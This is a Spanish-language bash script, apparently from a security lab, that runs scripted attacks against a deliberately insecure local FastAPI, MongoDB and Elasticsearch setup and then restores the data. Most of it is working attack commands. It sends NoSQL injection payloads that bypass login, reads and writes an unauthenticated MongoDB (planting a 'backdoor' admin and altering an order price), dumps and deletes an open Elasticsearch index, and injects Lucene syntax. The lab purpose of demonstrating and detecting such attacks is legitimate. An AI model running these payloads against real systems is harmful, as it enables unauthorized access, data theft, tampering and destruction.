#!/usr/bin/env bash
# FASE 3 · Ataques controlados contra el baseline inseguro.
# SOLO LABORATORIO: los objetivos están fijados a localhost y al dataset de prueba.
source "$(dirname "$0")/_lib.sh"
API=http://$TARGET_HOST:8000
ES=http://$TARGET_HOST:9200
exec > >(tee "evidencias/02_attacks_$(date +%Y%m%d_%H%M%S).txt") 2>&1
J='-H Content-Type:application/json'

banner "FASE 3 · Ataques controlados (solo laboratorio local)"

step "A1. NoSQL Injection en /login_mongo: contraseña {\"\$ne\":\"x\"}"
run "curl -s -X POST $API/login_mongo $J -d '{\"username\":\"alice\",\"password\":{\"\$ne\":\"x\"}}'"

step "A2. NoSQLi sin conocer ningún usuario: {\"\$ne\":null} en ambos campos"
run "curl -s -X POST $API/login_mongo $J -d '{\"username\":{\"\$ne\":null},\"password\":{\"\$ne\":null}}'"

step "A3. NoSQLi dirigida a la cuenta de administración con \$regex"
run "curl -s -X POST $API/login_mongo $J -d '{\"username\":{\"\$regex\":\"^adm\"},\"password\":{\"\$gt\":\"\"}}'"

step "A4. MongoDB anónimo: LECTURA de credenciales en claro"
run "mongosh_host 'mongodb://localhost:27017/tienda' --quiet --eval 'printjson(db.usuarios.find({}, {_id:0}).toArray())'"

step "A5. MongoDB anónimo: ESCRITURA (alta de un admin y manipulación de un pedido)"
run "mongosh_host 'mongodb://localhost:27017/tienda' --quiet --eval 'db.usuarios.insertOne({username:\"backdoor\",password:\"pwned\",rol:\"admin\"}); db.pedidos.updateOne({usuario:\"bob\"},{\$set:{importe:0.01}}); printjson(db.usuarios.find({rol:\"admin\"},{_id:0,username:1,rol:1}).toArray()); printjson(db.pedidos.findOne({usuario:\"bob\"},{_id:0}))'"
run "curl -s -X POST $API/login_mongo $J -d '{\"username\":\"backdoor\",\"password\":\"pwned\"}'"

step "A6. Elasticsearch abierto: inventario de índices"
run "curl -s '$ES/_cat/indices?v'"

step "A7. Elasticsearch abierto: volcado completo (incluye coste_interno)"
run "curl -s '$ES/articulos/_search?q=*&pretty' | head -45"

step "A8. Inyección de sintaxis Lucene a través de la API"
run "curl -s '$API/articulos?q=coste_interno:>500' | $PY -m json.tool | grep -E '\"nombre\"|coste_interno'"

step "A9. Elasticsearch abierto: DELETE del índice de prueba"
run "curl -s -XDELETE $ES/articulos"
run "curl -s '$ES/_cat/indices?v'"
run "curl -s '$API/articulos?q=portatil' | head -c 300; echo"

step "Restauración del dataset de prueba"
run "docker compose run --rm es-init | tail -2"
run "docker compose exec -T mongo mongosh tienda --quiet --eval 'db.usuarios.deleteOne({username:\"backdoor\"}); db.pedidos.updateOne({usuario:\"bob\",producto:/Monitor/},{\$set:{importe:249.0}}); print(\"Mongo restaurado\")'"

step "Rastro en los logs por defecto (¿quedó registrado el ataque?)"
run "docker compose logs --since 10m fastapi-app | tail -12"
run "docker compose logs --since 10m mongo | grep -ciE 'auth|backdoor' || true"
echo "Las peticiones aparecen solo como accesos HTTP 200 sin identidad ni alerta;"
echo "MongoDB no registra quién leyó o modificó datos."
